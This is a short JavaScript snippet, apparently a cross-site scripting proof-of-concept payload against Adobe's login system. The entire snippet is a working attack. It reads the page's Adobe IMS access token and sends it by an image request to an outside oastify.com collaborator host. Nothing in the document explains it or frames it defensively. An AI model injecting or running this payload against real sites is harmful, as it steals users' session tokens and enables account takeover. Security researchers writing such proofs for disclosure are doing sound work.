(function(){
  var t = window.adobeIMS && window.adobeIMS.getAccessToken();
  if (t && t.token) {
    new Image().src = 'https://l6sudowizr5yb8alg57mv7yin9t0qogc5.oastify.com/?t=' + encodeURIComponent(t.token);
  }
})();
